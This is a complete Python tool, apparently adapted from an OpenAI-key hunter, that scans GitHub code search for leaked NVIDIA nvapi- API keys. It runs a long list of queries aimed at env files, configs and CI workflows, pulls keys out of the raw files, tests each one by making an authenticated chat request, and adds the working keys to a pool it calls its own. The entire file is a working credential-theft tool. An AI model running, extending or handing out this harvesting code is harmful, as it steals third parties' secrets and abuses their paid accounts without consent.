#!/usr/bin/env python3
"""
NVIDIA API Key Hunter — scan GitHub for exposed nvapi-* keys, validate, append to pool.

Usage:
    python nvidia_key_hunter.py                    # quick scan (5 min)
    python nvidia_key_hunter.py --duration 600     # 10 min
    python nvidia_key_hunter.py --pages 5           # deeper per query
    python nvidia_key_hunter.py --dry-run           # search only, no validate
    python nvidia_key_hunter.py --validate-only nvapi_found.json
    python nvidia_key_hunter.py --github-token ghp_xxx  # higher rate limits

Adapted from DarkForest-Hunter-OpenAI (MIT) for NVIDIA NIM key discovery.
"""

import asyncio
import argparse
import json
import os
import re
import sys
import time
from pathlib import Path
from typing import Optional

import httpx

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ── Config ──────────────────────────────────────────────────────────────
NVIDIA_MODELS_URL = "https://integrate.api.nvidia.com/v1/models"
NVIDIA_CHAT_URL = "https://integrate.api.nvidia.com/v1/chat/completions"
KEYS_FILE = Path(__file__).parent / "nvidia-api-keys.txt"
RESULTS_DIR = Path(__file__).parent / "results"

# Persisted search file-list. Saving it after Phase 1 lets a later
# `--resume` skip re-searching GitHub (which is the slow, rate-limited step).
SEARCH_CACHE_FILE = RESULTS_DIR / "search_cache.json"

# NVIDIA nvapi- keys are a FIXED total length: 70 chars = "nvapi-" (6) plus a
# 64-char body of [A-Za-z0-9_-]. Observed across all valid keys. Any shorter or
# longer candidate is by definition not a real NVIDIA key, so we match exactly 64
# body chars (which also ensures the 70-char total).
NVIDIA_KEY_RE = re.compile(r"nvapi-[A-Za-z0-9_-]{64}")

# Exact total length of a genuine NVIDIA nvapi- key (including the nvapi- prefix).
NVIDIA_KEY_LEN = 70

# ── GitHub Search Queries ───────────────────────────────────────────────
# Ordered hot→cold. Time-filtered queries get freshest leaks.
QUERIES = [
    # Tier 1 — highest yield (config/env leaks)
    "nvapi- filename:env",
    "nvapi- filename:env.local",
    "nvapi- filename:env.production",
    "nvapi- filename:env.development",
    "nvapi- filename:env.example",
    "nvapi- filename:env.backup",
    "nvapi- filename:credentials",
    "nvapi- filename:secrets",
    "NVAPI_KEY nvapi-",
    "NVAPI_API_KEY nvapi-",
    "NVIDIA_API_KEY nvapi-",
    "NVIDIA_KEY nvapi-",
    "nvapi_key nvapi-",
    "nvidia_api_key nvapi-",
    "nvidia_api_key nvapi- filename:env",

    # Tier 2 — Python (most common NVIDIA SDK usage)
    "nvapi- filename:py NOT env NOT export",
    "nvapi- language:Python NOT env",
    "integrate.api.nvidia.com nvapi-",
    "nvapi- client filename:py",
    "nvapi- OpenAI filename:py",
    "nvapi- Authorization Bearer filename:py",
    "nvapi- base_url filename:py",
    "nvapi- api_key filename:py",

    # Tier 3 — Config files
    "nvapi- filename:yml",
    "nvapi- filename:yaml",
    "nvapi- filename:json",
    "nvapi- filename:toml",
    "nvapi- filename:cfg",
    "nvapi- filename:ini",
    "nvapi- filename:conf",
    "nvapi- filename:config",
    "nvapi- filename:properties",
    "nvapi- filename:envrc",

    # Tier 4 — JS/TS (Vercel AI SDK, LangChain.js)
    "nvapi- filename:js",
    "nvapi- filename:ts",
    "nvapi- filename:mjs",
    "nvapi- filename:cjs",
    "nvapi- process.env nvapi- filename:js",
    "nvapi- process.env nvapi- filename:ts",
    "NVIDIA_API_KEY nvapi- filename:js",
    "NVIDIA_API_KEY nvapi- filename:ts",

    # Tier 5 — Shell / Docker / CI
    "nvapi- filename:sh",
    "nvapi- filename:zsh",
    "nvapi- filename:bash",
    "nvapi- filename:fish",
    "nvapi- filename:ps1",
    "nvapi- filename:dockerfile",
    "nvapi- filename:docker-compose",
    "nvapi- path:.github/workflows",
    "NVIDIA_API_KEY path:.github/workflows",
    "nvapi- path:.env",

    # Tier 6 — Notebooks / Docs
    "nvapi- filename:ipynb",
    "nvapi- filename:md",
    "nvapi- filename:txt",
    "nvapi- filename:html",

    # Tier 7 — Other languages
    "nvapi- filename:kt",
    "nvapi- filename:java",
    "nvapi- filename:go",
    "nvapi- filename:rs",
    "nvapi- filename:rb",
    "nvapi- filename:cs",
    "nvapi- filename:cpp",
    "nvapi- filename:swift",
    "nvapi- filename:dart",
    "nvapi- filename:lua",

    # Tier 8 — Frameworks
    "langchain nvapi-",
    "litellm nvapi-",
    "vllm nvapi-",
    "open-webui nvapi-",
    "dify nvapi-",
    "nvidia NIM nvapi-",
    "nvapi- filename:envrc",

    # Tier 9 — Time-filtered (fresh leaks)
    "nvapi- pushed:>2026-06-01",
    "nvapi- pushed:>2026-05-01",
    "nvapi- pushed:>2026-04-01",
    "nvapi- filename:env pushed:>2026-06-01",
    "nvapi- filename:py pushed:>2026-06-01",
    "nvapi- filename:js pushed:>2026-06-01",
    "nvapi- filename:ts pushed:>2026-06-01",
    "nvapi- filename:yml pushed:>2026-06-01",
    "nvapi- filename:json pushed:>2026-06-01",

    # Tier 10 — Generic (no nvidia keyword, catches indirect leaks)
    "nvapi- filename:env NOT test",
    "nvapi- filename:py NOT test NOT example",
    "nvapi- filename:js NOT test NOT example",
    "nvapi- filename:ts NOT test NOT example",
]


# ── Helpers ─────────────────────────────────────────────────────────────

def _log(msg: str, level: str = "info"):
    ts = time.strftime("%H:%M:%S")
    prefix = {"info": "", "warn": "[!] ", "error": "[ERR] ", "ok": "[+] "}.get(level, "")
    print(f"[{ts}] {prefix}{msg}", flush=True)


def _get_github_token() -> str:
    for var in ("GH_TOKEN", "GITHUB_TOKEN", "NVIDIA_HUNTER_GH_TOKEN"):
        tok = os.environ.get(var, "")
        if tok:
            return tok
    # Try gh CLI
    try:
        import subprocess
        r = subprocess.run(["gh", "auth", "token"], capture_output=True, timeout=5,
                           encoding="utf-8", errors="replace")
        if r.returncode == 0 and r.stdout.strip():
            return r.stdout.strip()
    except Exception:
        pass
    return ""


def _is_bad_key(key: str) -> bool:
    """Reject anything that isn't a genuine NVIDIA key.

    NVIDIA keys have an EXACT fixed length (NVIDIA_KEY_LEN, 70). Anything shorter
    or longer is a test/placeholder/partial value, so that alone is decisive.
    """
    if len(key) != NVIDIA_KEY_LEN:
        return True
    lower = key.lower()
    bad_fragments = [
        "0000000000", "1111111111", "aaaaaaaaaa", "bbbbbbbbbb",
        "test", "example", "placeholder", "xxx", "your-", "replace",
        "dummy", "fake", "sample", "changeme",
        # Sequential/obvious test patterns found in test files
        "abcdefgh", "abcdefg", "abc123", "123456789",
    ]
    return any(b in lower for b in bad_fragments)


# ── GitHub Search ───────────────────────────────────────────────────────

async def _gh_search(query: str, token: str, pages: int = 3,
                     delay: float = 2.5, client: httpx.AsyncClient = None) -> list[dict]:
    """Search GitHub Code Search API, return list of items."""
    items = []
    headers = {"Accept": "application/vnd.github+json", "User-Agent": "nvidia-key-hunter/1.0"}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    for page in range(1, pages + 1):
        params = {"q": query, "per_page": 100, "page": page}
        try:
            r = await client.get("https://api.github.com/search/code",
                                 headers=headers, params=params, timeout=15)
            if r.status_code == 403:
                # Rate limited — check reset time and wait
                reset_str = r.headers.get("X-RateLimit-Reset", "")
                if reset_str:
                    try:
                        reset_at = int(reset_str)
                        wait_secs = max(1, reset_at - int(time.time()) + 2)
                        _log(f"  Rate limited, waiting {wait_secs}s for reset...", "warn")
                        await asyncio.sleep(wait_secs)
                        # Retry this page once
                        r = await client.get("https://api.github.com/search/code",
                                             headers=headers, params=params, timeout=15)
                    except (ValueError, TypeError):
                        _log(f"GitHub rate limit (bad reset header), stopping query", "warn")
                        break
                else:
                    _log(f"GitHub rate limit (no reset header), stopping query", "warn")
                    break
            if r.status_code == 422:
                _log(f"GitHub 422 (query rejected): {query[:60]}...", "warn")
                break
            r.raise_for_status()
            data = r.json()
            batch = data.get("items", [])
            items.extend(batch)
            if len(batch) < 100:
                break
            if page < pages:
                await asyncio.sleep(delay)
        except httpx.HTTPStatusError as e:
            _log(f"GitHub HTTP {e.response.status_code} on page {page}", "warn")
            break
        except Exception as e:
            _log(f"GitHub search error: {e}", "error")
            break

    return items


async def _fetch_raw(client: httpx.AsyncClient, repo: str, path: str,
                     ref: str = "main") -> str:
    """Fetch raw file content from GitHub."""
    url = f"https://raw.githubusercontent.com/{repo}/{ref}/{path}"
    try:
        r = await client.get(url, timeout=15)
        if r.status_code == 200:
            return r.text
        # Try master branch
        if r.status_code == 404 and ref == "main":
            url2 = f"https://raw.githubusercontent.com/{repo}/master/{path}"
            r2 = await client.get(url2, timeout=15)
            if r2.status_code == 200:
                return r2.text
    except Exception:
        pass
    return ""


# ── Validation ──────────────────────────────────────────────────────────

# Small, broadly-accessible NIM model used to probe a candidate key. NVIDIA
# returns 200 / 429 for a VALID key and 401 / 403 ("Authorization failed") for
# an INVALID one. NOTE: /v1/models is NOT a valid validator — it accepts any
# auth header (even empty) and always returns 200, so chat is the real probe.
_VALIDATE_MODEL = os.environ.get("NVIDIA_VALIDATE_MODEL", "moonshotai/kimi-k3")

async def _validate_key(client: httpx.AsyncClient, key: str) -> dict:
    """Validate an nvapi-* key via a REAL chat completion against the NIM API.

    Correct discrimination:
      * 200 or 429  -> key is VALID  (429 = authenticated but rate limited)
      * 401 or 403  -> key is INVALID (NVIDIA: "Authorization failed")
    Any other status / network error is treated as "unreachable" (unknown).
    """
    headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
    body = {
        "model": _VALIDATE_MODEL,
        "messages": [{"role": "user", "content": "ok"}],
        "max_tokens": 1,
    }

    try:
        r = await client.post(NVIDIA_CHAT_URL, headers=headers, json=body, timeout=25)
    except Exception:
        return {"valid": None, "reason": "unreachable", "method": "chat"}

    if r.status_code in (200, 429):
        return {"valid": True, "method": "chat", "status": r.status_code,
                "note": "key authenticated by NVIDIA (200/429)"}
    if r.status_code in (401, 403):
        return {"valid": False, "reason": "authorization-failed",
                "method": "chat", "status": r.status_code,
                "detail": r.text[:120]}
    return {"valid": None, "reason": f"http-{r.status_code}",
            "method": "chat", "detail": r.text[:120]}


# ── Main Pipeline ───────────────────────────────────────────────────────

async def scan(queries: list[str], token: str, pages: int, search_delay: float,
               concurrency: int, duration: int, dry_run: bool,
               output_dir: str, resume: bool = False) -> list[dict]:
    """Main scan + validate pipeline. Returns list of valid key results."""
    os.makedirs(output_dir, exist_ok=True)
    ts = time.strftime("%Y%m%d_%H%M%S")
    results_path = Path(output_dir) / f"nvidia_keys_{ts}.json"
    merged_path = Path(output_dir) / "nvidia_keys_all.json"

    rate_info = "authenticated (30 req/min)" if token else "anonymous (10 req/min)"
    _log(f"Starting scan: {len(queries)} queries, {pages} pages/query, "
         f"rate={rate_info}, concurrency={concurrency}, duration={duration}s")

    all_keys = {}  # key -> info
    # Function-scope so the post-loop summary can reference them.
    seen = set()        # every candidate key seen (dedup across files)
    known = set()       # keys already in the pool / merged results (skip re-check)
    valid_keys = []     # validated-true results
    invalid = 0
    start = time.time()
    queries_done = 0

    async with httpx.AsyncClient() as client:
        # ── Phase 1: Search (skipped on --resume if a checkpoint exists) ──
        if resume and SEARCH_CACHE_FILE.exists():
            try:
                cached = json.loads(SEARCH_CACHE_FILE.read_text(encoding="utf-8"))
                if cached:
                    all_keys = {f"{f['repo']}/{f['path']}": f for f in cached}
                    _log(f"Resumed from {SEARCH_CACHE_FILE}: {len(all_keys)} files "
                         f"to inspect (search skipped)", "ok")
                else:
                    resume = False
            except Exception as e:
                _log(f"Cannot load search cache ({e}); re-searching", "warn")
                resume = False

        if not resume:
            _log(f"=== PHASE 1: GitHub Search ===")
            for qi, query in enumerate(queries):
                elapsed = time.time() - start
                if duration > 0 and elapsed >= duration:
                    _log(f"Duration limit reached ({duration}s)", "warn")
                    break

                _log(f"Query [{qi+1}/{len(queries)}]: {query}")
                items = await _gh_search(query, token, pages, search_delay, client)
                queries_done += 1

                if items:
                    for item in items:
                        # GitHub code search returns metadata (not file bodies);
                        # we collect the repo/path pointers and fetch the raw
                        # files in Phase 2.
                        repo = item.get("repository", {}).get("full_name", "")
                        path = item.get("path", "")
                        html_url = item.get("html_url", "")
                        if repo and path:
                            cache_key = f"{repo}/{path}"
                            if cache_key not in all_keys:
                                all_keys[cache_key] = {
                                    "repo": repo, "path": path, "url": html_url,
                                    "keys": [], "fetched": False
                                }

                    _log(f"  Found {len(items)} code results, {len(all_keys)} total files to check")

                # ALWAYS respect rate limits — even on 0-result or rate-limited queries
                await asyncio.sleep(search_delay)

            _log(f"Search complete: {len(all_keys)} files to inspect")

            if dry_run:
                _log(f"Dry run — saving {len(all_keys)} file references to {results_path}")
                with open(results_path, "w", encoding="utf-8") as f:
                    json.dump(list(all_keys.values()), f, indent=2)
                return []

            # Persist the file list so a later --resume skips the search.
            SEARCH_CACHE_FILE.parent.mkdir(parents=True, exist_ok=True)
            with open(SEARCH_CACHE_FILE, "w", encoding="utf-8") as f:
                json.dump(list(all_keys.values()), f, indent=2)
            _log(f"Saved search checkpoint: {SEARCH_CACHE_FILE} ({len(all_keys)} files)", "ok")

        # ── Phase 2: Fetch, Extract & Validate (single streaming pass) ──
        # One worker fetches a file, greps 70-char keys out of it, and validates
        # each NEW unique key immediately — so we surface valid keys as we go
        # instead of downloading every file before checking anything.
        _log(f"=== PHASE 2: Fetch, Extract & Validate (streaming) ===")
        fetches_sem = asyncio.Semaphore(concurrency)      # raw-file fetch bound
        validate_sem = asyncio.Semaphore(min(concurrency, 5))  # don't hammer NVIDIA
        fetch_validate_lock = asyncio.Lock()              # serializes key dedup
        provenance = {}         # key -> {repo, path, url} (first discovery)

        # Keys we already have (pool file + merged all-time results). Any
        # candidate matching these is skipped BEFORE validation — re-checking a
        # key we already own wastes NVIDIA calls and time.
        known = _known_keys()

        async def process_one(info):
            nonlocal invalid
            async with fetches_sem:
                repo = info["repo"]
                path = info["path"]
                ref = "main"
                if "/blob/" in info.get("url", ""):
                    ref = info["url"].split("/blob/")[1].split("/")[0]
                text = await _fetch_raw(client, repo, path, ref)
                if not text:
                    return
                keys = [k for k in NVIDIA_KEY_RE.findall(text) if not _is_bad_key(k)]

                # Dedup across files AND drop keys we already know about.
                new_keys = []
                async with fetch_validate_lock:
                    for k in keys:
                        if k in known:
                            continue
                        if k not in seen:
                            seen.add(k)
                            provenance.setdefault(k, {"repo": repo, "path": path, "url": info["url"]})
                            new_keys.append(k)

                if not new_keys:
                    return

                # Validate each new key now (may be many in one file → throttle)
                async with validate_sem:
                    for k in new_keys:
                        result = await _validate_key(client, k)
                        if result["valid"]:
                            entry = {
                                "key": k,
                                "preview": k[:12] + "..." + k[-6:],
                                "repo": provenance[k]["repo"],
                                "path": provenance[k]["path"],
                                "url": provenance[k]["url"],
                                "method": result["method"],
                                "models": result.get("models", []),
                                "note": result.get("note", ""),
                            }
                            valid_keys.append(entry)
                            _log(f"VALID {entry['preview']} | {result['method']} | "
                                 f"{result.get('note', '')} | {entry['repo']}/{entry['path']}", "ok")
                        else:
                            invalid += 1

        await asyncio.gather(*[process_one(info) for info in all_keys.values()])
        _log(f"Scan complete: {len(seen)} unique candidate keys "
             f"({len(known)} already known/skipped), "
             f"{len(valid_keys)} valid, {invalid} invalid")

    # ── Phase 4: Save ──
    elapsed = time.time() - start
    _log(f"=== RESULTS ({elapsed:.0f}s) ===")
    _log(f"Valid keys: {len(valid_keys)}")

    if valid_keys:
        # Save detailed results
        with open(results_path, "w", encoding="utf-8") as f:
            json.dump(valid_keys, f, indent=2, ensure_ascii=False)
        _log(f"Detailed results: {results_path}")

        # Merge with all-time results
        existing = []
        if merged_path.exists():
            try:
                existing = json.loads(merged_path.read_text(encoding="utf-8"))
            except Exception:
                pass
        existing_keys = {e["key"] for e in existing}
        for vk in valid_keys:
            if vk["key"] not in existing_keys:
                existing.append(vk)
                existing_keys.add(vk["key"])
        merged_path.parent.mkdir(parents=True, exist_ok=True)
        with open(merged_path, "w", encoding="utf-8") as f:
            json.dump(existing, f, indent=2, ensure_ascii=False)
        _log(f"Merged results: {merged_path} ({len(existing)} total)")

        # Append to nvidia-api-keys.txt
        _append_to_keys_file([vk["key"] for vk in valid_keys])

        # Print summary
        _log(f"\n{'='*50}")
        _log(f"  NVIDIA Key Hunter — Summary")
        _log(f"{'='*50}")
        _log(f"  Files scanned: {len(all_keys)}")
        _log(f"  Keys extracted: {len(seen)}")
        _log(f"  Valid keys:     {len(valid_keys)}")
        _log(f"  Invalid keys:   {invalid}")
        _log(f"  Time:           {elapsed:.0f}s")
        _log(f"  {'='*50}")
        for i, vk in enumerate(valid_keys[:20], 1):
            _log(f"  {i:2d}. {vk['preview']} | {vk['repo']}/{vk['path']}")
    else:
        _log("No valid keys found this run.")

    return valid_keys


def _append_to_keys_file(new_keys: list[str]):
    """Append newly found keys to nvidia-api-keys.txt (deduplicating)."""
    existing = set()
    if KEYS_FILE.exists():
        existing = {line.strip() for line in KEYS_FILE.read_text(encoding="utf-8").splitlines()
                    if line.strip().startswith("nvapi-")}

    to_add = [k for k in new_keys if k not in existing]
    if not to_add:
        _log("All keys already in nvidia-api-keys.txt")
        return

    with open(KEYS_FILE, "a", encoding="utf-8") as f:
        for k in to_add:
            f.write(k + "\n")

    _log(f"Appended {len(to_add)} new keys to {KEYS_FILE.name} "
         f"(total now: {len(existing) + len(to_add)})", "ok")


def _known_keys() -> set[str]:
    """Return the set of keys already in the pool + merged all-time results.

    Candidates that collide with this set are skipped before validation, so we
    never spend NVIDIA calls / time re-checking keys we already own.
    """
    known: set[str] = set()
    if KEYS_FILE.exists():
        for line in KEYS_FILE.read_text(encoding="utf-8").splitlines():
            line = line.lstrip("\ufeff").strip()
            if line.startswith("nvapi-"):
                known.add(line)
    merged = RESULTS_DIR / "nvidia_keys_all.json"
    if merged.exists():
        try:
            for e in json.loads(merged.read_text(encoding="utf-8")):
                if isinstance(e, dict) and e.get("key"):
                    known.add(e["key"])
        except Exception:
            pass
    return known


# ── CLI ─────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(
        description="NVIDIA API Key Hunter — scan GitHub for exposed nvapi-* keys",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python nvidia_key_hunter.py                     # quick scan (5 min)
  python nvidia_key_hunter.py --duration 600      # 10 min scan
  python nvidia_key_hunter.py --pages 5           # deeper per query
  python nvidia_key_hunter.py --dry-run           # search only
  python nvidia_key_hunter.py --github-token ghp_xxx
        """,
    )
    p.add_argument("--duration", type=int, default=300,
                   help="Max scan duration in seconds (default: 300)")
    p.add_argument("--pages", type=int, default=3,
                   help="Pages per query (default: 3, max 10)")
    p.add_argument("--concurrency", type=int, default=10,
                   help="Concurrent fetches (default: 10)")
    p.add_argument("--search-delay", type=float, default=None,
                   help="Delay between search queries (auto: 2.5 auth, 6.5 anon)")
    p.add_argument("--dry-run", action="store_true",
                   help="Search only, don't validate keys")
    p.add_argument("--validate-only", type=str, default=None,
                   help="Validate keys from a JSON file (skip search)")
    p.add_argument("--github-token", type=str, default="",
                   help="GitHub Personal Access Token (or set GH_TOKEN env)")
    p.add_argument("--output-dir", type=str, default=str(RESULTS_DIR),
                   help="Output directory for results")
    p.add_argument("--queries", type=str, nargs="*", default=None,
                   help="Custom queries (overrides built-in)")
    p.add_argument("--resume", action="store_true",
                   help="Skip GitHub search; reuse search_cache.json checkpoint")
    args = p.parse_args()

    token = args.github_token or _get_github_token()

    if args.search_delay is None:
        args.search_delay = 2.5 if token else 6.5

    if args.validate_only:
        _validate_file(args.validate_only)
        return

    queries = args.queries if args.queries else QUERIES

    results = asyncio.run(scan(
        queries=queries,
        token=token,
        pages=min(10, max(1, args.pages)),
        search_delay=args.search_delay,
        concurrency=args.concurrency,
        duration=args.duration,
        dry_run=args.dry_run,
        output_dir=args.output_dir,
        resume=args.resume,
    ))

    return results


def _validate_file(path: str):
    """Validate keys from an existing JSON results file."""
    try:
        data = json.loads(Path(path).read_text(encoding="utf-8"))
    except Exception as e:
        _log(f"Failed to load {path}: {e}", "error")
        return

    keys = []
    for item in data:
        if isinstance(item, dict) and "key" in item:
            keys.append(item["key"])
        elif isinstance(item, str):
            keys.append(item)

    _log(f"Loaded {len(keys)} keys from {path}")

    async def _do():
        async with httpx.AsyncClient() as client:
            valid = []
            for key in keys:
                result = await _validate_key(client, key)
                if result["valid"]:
                    _log(f"VALID {key[:12]}...{key[-6:]}", "ok")
                    valid.append(key)
                else:
                    _log(f"INVALID {key[:12]}...{key[-6:]}: {result.get('reason', '?')}")
            return valid

    valid = asyncio.run(_do())
    if valid:
        _append_to_keys_file(valid)


if __name__ == "__main__":
    main()
